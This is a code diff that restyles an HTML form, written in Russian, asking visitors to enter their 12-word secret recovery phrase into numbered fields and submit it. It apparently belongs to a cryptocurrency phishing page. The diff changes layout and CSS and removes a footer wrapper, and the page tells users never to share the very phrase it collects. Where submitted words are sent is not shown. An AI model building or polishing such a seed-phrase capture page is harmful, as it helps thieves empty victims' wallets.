@@ -24,7 +24,6 @@
             padding: 20px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             text-align: center;
-            position: relative;
         }
         .logo {
             width: 80px;
@@ -44,7 +43,6 @@
         h1 {
             font-size: 20px;
             margin-bottom: 16px;
-            color: #FFFFFF;
         }
         .description {
             font-size: 14px;
@@ -54,18 +52,18 @@
         .seed-input {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 8px;
+            gap: 16px;
         }
         .seed-item {
-            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
         }
         .seed-item label {
-            position: absolute;
-            top: -14px;
-            left: 10px;
             font-size: 12px;
             color: #A0A0A0;
             font-weight: bold;
+            margin-bottom: 4px;
         }
         input {
             padding: 8px;
@@ -74,7 +72,6 @@
             border-radius: 6px;
             background-color: #2C2C2C;
             color: #FFFFFF;
-            text-align: center;
             width: 100%;
             box-sizing: border-box;
         }
@@ -106,12 +103,6 @@
             color: #FFD700;
             text-align: center;
         }
-        .footer {
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
     </style>
 </head>
 <body>
@@ -126,63 +117,58 @@
         <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
             <div class="seed-input">
-                <!-- Поля для ввода -->
-                <div class="seed-input">
-    <div class="seed-item">
-        <label for="word1">1.</label>
-        <input type="text" id="word1" name="word1" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word2">2.</label>
-        <input type="text" id="word2" name="word2" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word3">3.</label>
-        <input type="text" id="word3" name="word3" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word4">4.</label>
-        <input type="text" id="word4" name="word4" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word5">5.</label>
-        <input type="text" id="word5" name="word5" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word6">6.</label>
-        <input type="text" id="word6" name="word6" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word7">7.</label>
-        <input type="text" id="word7" name="word7" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word8">8.</label>
-        <input type="text" id="word8" name="word8" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word9">9.</label>
-        <input type="text" id="word9" name="word9" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word10">10.</label>
-        <input type="text" id="word10" name="word10" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word11">11.</label>
-        <input type="text" id="word11" name="word11" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-    <div class="seed-item">
-        <label for="word12">12.</label>
-        <input type="text" id="word12" name="word12" placeholder="слово" required autocomplete="off" autocapitalize="none">
-    </div>
-</div>
+                <div class="seed-item">
+                    <label for="word1">1.</label>
+                    <input type="text" id="word1" name="word1" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word2">2.</label>
+                    <input type="text" id="word2" name="word2" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word3">3.</label>
+                    <input type="text" id="word3" name="word3" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word4">4.</label>
+                    <input type="text" id="word4" name="word4" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word5">5.</label>
+                    <input type="text" id="word5" name="word5" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word6">6.</label>
+                    <input type="text" id="word6" name="word6" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word7">7.</label>
+                    <input type="text" id="word7" name="word7" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word8">8.</label>
+                    <input type="text" id="word8" name="word8" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word9">9.</label>
+                    <input type="text" id="word9" name="word9" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word10">10.</label>
+                    <input type="text" id="word10" name="word10" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word11">11.</label>
+                    <input type="text" id="word11" name="word11" placeholder="слово" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word12">12.</label>
+                    <input type="text" id="word12" name="word12" placeholder="слово" required>
+                </div>
             </div>
             <button type="submit">Отправить</button>
         </form>
-        <div class="footer">
-            <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
-        </div>
+        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
 </body>
 </html>
